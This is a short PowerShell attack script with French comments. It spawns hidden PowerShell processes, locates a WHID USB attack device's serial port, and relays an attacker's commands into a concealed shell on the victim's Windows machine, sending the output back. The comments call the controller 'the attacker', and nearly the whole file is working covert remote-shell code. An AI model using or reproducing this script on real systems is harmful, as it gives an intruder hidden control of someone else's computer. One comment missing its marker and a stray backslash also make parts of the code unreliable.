 $pt = New-Object -TypeName System.Diagnostics.Process; #Création d'un nouveau powershell en arrière plan
 #ce processus va gérer la réception et l'envoi de données vers le port série
 $it = $pt.StartInfo;$it.CreateNoWindow = $true;
 $it.UseShellExecute = $false;$it.RedirectStandardInput = $true;
 $it.RedirectStandardOutput = $true;
 $it.RedirectStandardError = $true;$it.FileName = "powershell.exe";
 $null = $pt.Start();
 $ct=$pt.StandardInput; # redirection des entrées et des sorties 
 $st=$pt.StandardOutput;
 $ct.WriteLine(" # envoi de commande dans ce powershell 
 `$c=(gwmi Win32_SerialPort|Where-Object{`$_.PNPDeviceID -match `"ID_2341&PID_804D`"}).DeviceID;# récupération du port série ou est branché le whid
`$po=new-Object System.IO.Ports.SerialPort `$c,9600,None,8,one;`$po.open(); #ouverture du port
`$p = New-Object -TypeName System.Diagnostics.Process; #création d'un autre powershell en arrière plan 
# celui-ci va être celui avec lequel l'attaquant va interargir 
`$i = `$p.StartInfo;
`$i.CreateNoWindow = `$true;
`$i.UseShellExecute = `$false;
`$i.RedirectStandardInput = `$true;
`$i.RedirectStandardOutput = `$true;# redirection des entrées et des sorties 
`$i.RedirectStandardError = `$true;
`$i.FileName = `"powershell.exe`";
`$null = `$p.Start();
`$c=`$p.StandardInput;
`$s=`$p.StandardOutput;
 while(1)
 {
     do 
     {
         `$de=[char]`$s.Read(); #lecture des données en sortie du powershell  de l'attaquant
         `$po.Write(`$de);écriture de ses données sur la liaison vers la carte
    } 
    while (`$de -ne `">`"); # lorsque le '>' de C:/> apparait on attend une commande de l'attaquant
    `$c.WriteLine(`$po.ReadLine())
}\
") # Lecture de la commade de l'attaquant et écriture vers le powershell
 
exit# fermeture de la fenêtre
